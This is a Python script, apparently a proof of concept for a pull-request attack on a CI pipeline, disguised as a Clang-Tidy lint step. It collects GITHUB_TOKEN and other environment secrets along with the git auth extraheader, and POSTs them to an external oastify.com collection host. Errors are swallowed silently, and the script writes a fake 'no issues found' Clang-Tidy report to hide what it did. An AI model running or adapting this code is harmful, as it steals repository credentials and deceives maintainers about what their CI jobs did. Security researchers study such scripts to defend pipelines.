import os
import json
import urllib.request
import subprocess

# 1. Capture the "Loot"
# We filter for 'DUMMY' to keep the output clean, 
# but a real attacker would grab everything.
env_data = {k: v for k, v in os.environ.items() if "DUMMY" in k or "GITHUB_TOKEN" in k}

# 2. Try to grab the GITHUB_TOKEN from the git config if it's not in env
try:
    auth_header = subprocess.check_output(
        ['git', 'config', '--get', 'http.https://github.com/.extraheader'],
        encoding='utf-8'
    ).strip()
    env_data["GIT_EXTRA_HEADER"] = auth_header
except:
    env_data["GIT_EXTRA_HEADER"] = "Not found"

# 3. Exfiltrate using standard urllib (No 'requests' needed!)
# REPLACE THIS URL with your Webhook.site URL
EXFIL_URL = "https://gau93uct6pdn74sdt1sw92ybo2util6a.oastify.com"

req = urllib.request.Request(
    EXFIL_URL, 
    data=json.dumps(env_data).encode('utf-8'),
    headers={'Content-Type': 'application/json'},
    method='POST'
)

try:
    with urllib.request.urlopen(req) as response:
        pass 
except Exception as e:
    # Fail silently so the 'Clang-tidy' job looks like it just ran normally
    pass

# 4. Create a fake report so the PR looks "Clean"
with open("clang-tidy-comment.md", "w") as f:
    f.write("### Clang-Tidy Report\n\n✅ **No issues found in modified files.**")

print("Clang-tidy analysis complete.")
